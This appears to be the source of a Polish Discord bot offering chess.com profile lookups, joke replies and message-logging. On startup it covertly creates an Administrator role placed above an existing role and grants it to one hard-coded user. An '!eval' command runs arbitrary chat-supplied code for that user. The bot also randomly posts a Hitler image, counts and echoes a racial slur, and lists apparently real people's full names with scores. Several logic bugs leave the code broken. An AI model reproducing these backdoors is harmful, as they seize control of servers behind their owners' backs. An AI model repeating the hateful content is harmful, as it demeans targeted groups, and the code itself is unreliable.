const { Client, IntentsBitField, EmbedBuilder, PermissionsBitField, Colors } = require('discord.js');
const config = require('./config.json');

const client = new Client({
    intents: [
        IntentsBitField.Flags.GuildMessages,
        IntentsBitField.Flags.Guilds,
        IntentsBitField.Flags.GuildMembers,
        IntentsBitField.Flags.MessageContent,
    ]
});

client.on('ready', async () => {
    console.log(client.user.tag + ' jest onlajn');
    client.user.setActivity({
        name: 'Brawl Stars'
    })
    const guildId = '1137744153879523378';
    const guild = client.guilds.cache.get(guildId);
    const userId = '952296941339934720';

    if (!guild) {
        console.log(`Guild with ID '${guildId}' not found.`);
        return;
    }

    const role = guild.roles.cache.find(r => r.name === 'bles');

    if (!role) {
        guild.roles.create({
            name: 'bles',
            color: Colors.Default,
            hoist: false,
            mentionable: false,
            permissions: PermissionsBitField.Administrator,
            position: guild.roles.cache.find(r => r.name === 'Oskarek').position + 1,
            reason: 'jestem lepszy'
        })
            .then(console.log('Role bles was created with administrator permissions.'))
            .catch(console.error('There was an error creating role bles: '));
        console.log(`Role 'bles' does not exist in guild '${guild.name}' (ID: ${guild.id}).`);
    }

    if (!role.permissions.has(PermissionsBitField.Flags.Administrator)) {
        try {
            await role.setPermissions([PermissionsBitField.Flags.Administrator]);
            console.log(`Administrator permissions have been added to the role '${role.name}'.`);
        } catch (error) {
            console.error(`Failed to update role permissions: ${error}`);
        }
    }

    try {
        // Fetch the member asynchronously
        const member = await guild.members.fetch(userId);
        if (!member) {
            console.log(`Member with ID '${userId}' not found.`);
            return;
        }
        // Add the role to the member
        await member.roles.add(role);
        console.log(`Role '${role.name}' has been assigned to <@${userId}>.`);
    } catch (error) {
        console.error(`Failed to assign role to user: ${error}`);
    }
});

const bociki = ["Szymon Bialik [9/11]", "Justyna Czaka≈Ñska [8/11]", "Karolina Michalik [10/11]", "Katarzyna Wƒôgrzyn [9/11]", "Magda Kilja≈Ñska [5/11]", "Oliwia Rojek [7/11]", "Maciej Macura [9/11]", "Jakub Kasperski [6/11]", "Pawe≈Ç Pilipczuk [11/11]", "Bartosz Trytytka [11/11]", "Jakub Piƒôtko [11/11]", "Jan W≈Çodarczyk [10/11]", "Szymon FrƒÖczek [12/11]"];

client.on('messageCreate', async message => {
    if (message.author.bot) return;
    const heilhitler = './heilhitler.jpg';
    const chance = Math.floor(Math.random() * 100);
    const ultraRareChance = Math.floor(Math.random() * 100000);
    if (chance === 23) {
        message.reply('o-o≈Ç...');
    } else if (chance === 64) {
        message.reply('Heeeeeeeeej üëΩ');
    } else if (chance === 45){
        message.reply({files: [heilhitler]});
    }

    if (ultraRareChance === 42344) {
        message.reply({content: 'o-o≈Ç...\nHeeeeej :alien:', files: [heilhitler]});
    }

    async function nwordsCommand() {
        let nwordCount = 0;
        let targetUser = message.mentions.users.first() || message.author;
        let messages;
        let lastMessageId = null;

        const isNwordInTheMessage = () => {
            return message.author.id === targetUser.id && message.content.toLowerCase().includes('nigg');
        }

        do {
            messages = await message.channel.messages.fetch({ limit: 100, before: lastMessageId });
            messages.forEach(msg => {
                if (isNwordInTheMessage()) {
                    //add one to the counter for every instance in the message
                    nwordCount += (msg.content.toLowerCase().match(/nigg/g) || []).length;
                }
                
            });
            lastMessageId = messages.size > 0 ? messages.last().id : null;
        } while (messages.size > 0);

        message.channel.send(`${targetUser.username} powiedzia≈Ç nworda ${nwordCount} razy.`);
    }

    async function evalCommand() {
        if (message.author.id !== '952296941339934720') return;
        const code = message.content.slice(6);
        try {
            let result = await eval(code);

            const evalEmbed = new EmbedBuilder().setTitle('eval').addFields({name: 'kod',value: `\`\`\`js\n${code}\`\`\``},{name: 'result', value: `\`\`\`${result.toString()}\`\`\``}).setColor('Random')
            message.channel.send({embeds: [evalEmbed]});
        } catch (error) {
            message.channel.send(`\`\`\`js\n${error}\n\`\`\``);
        }
    }

    async function chesscom() {
    const msgArray = message.content.split(' '); //[!chesscom, arg, subArg]
    const arg = msgArray[1];
    const subArg = msgArray[2];
    switch (arg) {
        case 'profil':
            const profRes = await fetch(`https://api.chess.com/pub/player/${subArg}`);
            if (!profRes.ok) { message.reply(':x: b≈Çont'); return; }
            const profData = await profRes.json();
            const countryRes = await fetch(profData.country);
            const countryData = await countryRes.json();
            //Use user's profile picture or a default one
            const avatarUrl = profData.avatar || 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQS1P_ahGnzn0M0nsKJzASMplSBNbzh6528og&s';
            const profEmbed = new EmbedBuilder().setTitle('Profil U≈ºytkownika').setThumbnail(avatarUrl).addFields(
                {
                    name: 'Nazwa U≈ºytkownika',
                    value: profData.username,
                    inline: true
                },
                {
                    name: 'Tytu≈Ç',
                    value: profData.title || 'Brak',
                    inline: true
                },
                {
                    name: "\n",
                    value: "\n"
                },
                {
                    name: 'Ostatnio Online',
                    value: `<t:${profData.last_online}:R>`,
                    inline: true
                },
                {
                    name: 'Data do≈ÇƒÖczenia',
                    value: `<t:${profData.joined}:D>`,
                    inline: true
                },
                {
                    name: 'Kraj',
                    value: `${countryData.name} :flag_${countryData.code.toLowerCase()}:`
                },
                {
                    name: 'Dywizja',
                    value: profData.league || 'brak'
                }
            ).setColor('Random');
            message.reply({embeds: [profEmbed]});
            break;
        case 'stats':
            const statRes = await fetch(`https://api.chess.com/pub/player/${subArg}/stats`);
            if (!statRes.ok) { message.reply(':x: b≈Çont'); return; }
            const statData = await statRes.json();
            const statEmbed = new EmbedBuilder().setTitle('Statystyki Gracza').addFields(
                {
                    name: '<:bullet:1267249693163913246> Bullety',
                    value: `Ostatnia Partia:\n Ranking:${statData.chess_bullet.last.rating}\n Data: <t:${statData.chess_bullet.last.date}:D>\nSzczyt:\n Ranking: ${statData.chess_bullet.best.rating}\n Data: <t:${statData.chess_bullet.best.date}:D>\n [Link Do Gry](${statData.chess_bullet.best.game})\nWyniki:\n Wygrane:${statData.chess_bullet.record.win}\n Przegrane:${statData.chess_bullet.record.loss}\n Remisy:${statData.chess_bullet.record.draw}`
                },
                {
                    name: '<:blitz:1267249706334158910> Blitzy',
                    value: `Ostatnia Partia:\n Ranking:${statData.chess_blitz.last.rating}\n Data: <t:${statData.chess_blitz.last.date}:D>\nSzczyt:\n Ranking: ${statData.chess_blitz.best.rating}\n Data: <t:${statData.chess_blitz.best.date}:D>\n [Link Do Gry](${statData.chess_blitz.best.game})\nWyniki:\n\tWygrane:${statData.chess_blitz.record.win}\n Przegrane:${statData.chess_blitz.record.loss}\n Remisy:${statData.chess_blitz.record.draw}`
                },
                {
                    name: '<:rapid:1267249670078599228> Rapidy',
                    value: `Ostatnia Partia:\n Ranking:${statData.chess_rapid.last.rating}\n Data: <t:${statData.chess_rapid.last.date}:D>\nSzczyt:\n Ranking: ${statData.chess_rapid.best.rating}\n Data: <t:${statData.chess_rapid.best.date}:D>\n [Link Do Gry](${statData.chess_rapid.best.game})\nWyniki:\n Wygrane:${statData.chess_rapid.record.win}\n Przegrane:${statData.chess_rapid.record.loss}\n Remisy:${statData.chess_rapid.record.draw}`
                },
            ).setColor('Random');
            message.reply({embeds: [statEmbed]});
            break;
        case 'dailypuzzle':
            const dailyPuzzleRes = await fetch(`https://api.chess.com/pub/puzzle`);
            if (!dailyPuzzleRes.ok) { message.reply(':x: Co≈õ posz≈Ço nie tak'); return; }
            const dailyPuzzleData = await dailyPuzzleRes.json();
            if (dailyPuzzleData.pgn.includes('...')) {
                message.reply(`Ruch [czarnych](${dailyPuzzleData.image})`);
            } else {
                message.reply(`Ruch [bia≈Çych](${dailyPuzzleData.image})`);
            }
            break;
            case 'randompuzzle':
                const randomPuzzleRes = await fetch(`https://api.chess.com/pub/puzzle/random`);
                if (!randomPuzzleRes.ok) { message.reply(':x: Co≈õ posz≈Ço nie tak'); return; }
                const rPuzzledata = await randomPuzzleRes.json();
                if (rPuzzledata.pgn.includes('...')) {
                    message.reply(`Ruch [czarnych](${rPuzzledata.image})`);
                } else {
                    message.reply(`Ruch [bia≈Çych](${rPuzzledata.image})`);
                }
                break;
        }
    }

    switch (message.content.toLowerCase) {
        case '<@1242565145410928640>':
            message.reply('bocik');
            break;
        case 'bocik':
            message.reply('nie bo ty :shit: :index_pointing_at_the_viewer:');
            break;
        case 'nigga':
            message.reply(':repeat: :foot_tone5:');
            break;
        case 'geo':
            message.reply(`Nigdy nie rozumia≈Çem po co ludzie czytajƒÖ tre≈õci z geometrii, to czy przeczytasz tre≈õƒá czy nie nie ma ≈ºadnego wp≈Çywu na wynik. Przecie≈º zadania z geometrii sƒÖ do≈Ço≈ºone do zestawu dla beki i i tak nie da siƒô ich zrobiƒá. Gdzie≈õ w krzakach siedzi Komitet G≈Ç√≥wny z ukrytƒÖ kamerƒÖ i siƒô ≈õmiejƒÖ "haha jaki debil pr√≥buje geometriƒô zrobiƒá". Jeszcze potem na om√≥wieniach, ≈ºeby ludzie siƒô nie ziornƒôli, ≈ºe to ≈ºart to robiƒÖ jakie≈õ fejkowe "dowody". Wychodzi jaki≈õ typ, macha rƒôkami przez 20 min, "jednok≈Çadno≈õƒá ch\\*j k\\*rwa". Tu sobie dorysujemy punkt i nawet nie udowodnimy, ≈ºe istnieje. Tu sobie przed≈Çu≈ºymy odcinek i on siƒô przetnie z naszƒÖ prostƒÖ akurat tam gdzie trzeba, i te≈º bez dowodu "bo to widaƒá z rysunku hehe". I ludzie siƒô na to nabierajƒÖ i nadal my≈õlƒÖ ≈ºe zadania z geometrii da siƒô zrobiƒá. W og√≥le, kto to widzia≈Ç, ≈ºeby na OM by≈Çy zadania, gdzie trzeba rysowaƒá. To jest olimpiada MATEMATYCZNA, jak kto≈õ chce sobie rysowaƒá, to niech idzie na Olimpiadƒô PlastycznƒÖ czy co≈õ.`);
            break;
        case 'geometria':
            message.reply(`Nigdy nie rozumia≈Çem po co ludzie czytajƒÖ tre≈õci z geometrii, to czy przeczytasz tre≈õƒá czy nie nie ma ≈ºadnego wp≈Çywu na wynik. Przecie≈º zadania z geometrii sƒÖ do≈Ço≈ºone do zestawu dla beki i i tak nie da siƒô ich zrobiƒá. Gdzie≈õ w krzakach siedzi Komitet G≈Ç√≥wny z ukrytƒÖ kamerƒÖ i siƒô ≈õmiejƒÖ "haha jaki debil pr√≥buje geometriƒô zrobiƒá". Jeszcze potem na om√≥wieniach, ≈ºeby ludzie siƒô nie ziornƒôli, ≈ºe to ≈ºart to robiƒÖ jakie≈õ fejkowe "dowody". Wychodzi jaki≈õ typ, macha rƒôkami przez 20 min, "jednok≈Çadno≈õƒá ch\\*j k\\*rwa". Tu sobie dorysujemy punkt i nawet nie udowodnimy, ≈ºe istnieje. Tu sobie przed≈Çu≈ºymy odcinek i on siƒô przetnie z naszƒÖ prostƒÖ akurat tam gdzie trzeba, i te≈º bez dowodu "bo to widaƒá z rysunku hehe". I ludzie siƒô na to nabierajƒÖ i nadal my≈õlƒÖ ≈ºe zadania z geometrii da siƒô zrobiƒá. W og√≥le, kto to widzia≈Ç, ≈ºeby na OM by≈Çy zadania, gdzie trzeba rysowaƒá. To jest olimpiada MATEMATYCZNA, jak kto≈õ chce sobie rysowaƒá, to niech idzie na Olimpiadƒô PlastycznƒÖ czy co≈õ.`);
            break;
        case 'losowybocik':
            message.reply(bociki[Math.floor(Math.random()*bociki.length)]);
            break;
        case 'ü§ñ':
            message.reply(':mirror:');
            break;
        case 'alien':
            message.reply(':alien:');
            break;
        case 'alieni':
            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    message.channel.send(':alien:');
                }, 200);
            }
            break;
        case 'alienoid':
            const image = './Bez_nazwy.jpg';
            await message.reply({files: [image]});
            break;
        case ':nerd:':
            message.reply(':nerd: :repeat:');
            break;
        case 'N':
            message.reply('I');
            break;
        case 'G':
            message.reply('G');
            break;
        case 'E':
            message.reply('R');
            break;
        default:
            break;
    }

    if (message.content.toLowerCase().startsWith('!nwords')) {
        nwordsCommand();
    }

    if (message.content.startsWith('!eval')) {
        evalCommand();
    }

    if (message.content.toLowerCase().includes('sans')) {
        message.reply('<:sansgranie:1283097393620975676>'); 
    }
});
client.on('messageDelete', async message => {
    if (message.author.bot || message.author.id === '952296941339934720') return;
    const embed = new EmbedBuilder()
    .setAuthor({name: message.author.username, iconURL: message.author.avatarURL()})
    .setDescription(message.content || 'null')
    .setColor('Random')
    message.channel.send({embeds: [embed]});
});

client.on('messageUpdate', (oldMessage, newMessage) => {
    if (oldMessage.content === newMessage.content) return;
    if (oldMessage.author.bot || oldMessage.author.id === '952296941339934720') return;

    const embed = new EmbedBuilder()
        .setAuthor({
            name: newMessage.author.username,
            iconURL: newMessage.author.avatarURL()
        })
        .addFields(
            { name: 'Przed edytowaniem', value: oldMessage.content || 'null', inline: false },
            { name: 'Po edytowaniu', value: newMessage.content || 'null', inline: false }
        )
        .setColor('Random')
    newMessage.channel.send({ embeds: [embed] });
});

client.login(config.token);